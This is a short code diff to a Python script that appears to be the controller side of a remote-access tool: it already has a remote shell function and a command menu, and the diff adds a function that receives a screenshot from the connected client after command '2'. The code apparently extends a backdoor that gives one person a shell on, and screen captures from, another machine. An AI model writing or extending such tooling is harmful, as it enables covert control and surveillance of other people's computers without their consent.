@@ -39,7 +39,11 @@ def open_shell():
         print(output.decode())
         
 
-
+def recv_screenshot():
+    buf = conn_to_client.recv(40960000)
+    print(buf)
+            
+        
 
 def main():
     establish_connection()
@@ -51,6 +55,7 @@ def main():
             open_shell()
         elif choice == "2":
             conn_to_client.sendall(b'2')
+            recv_screenshot()
         elif choice == "6":
             conn_to_client.sendall(b'6')
             conn_to_client.close()
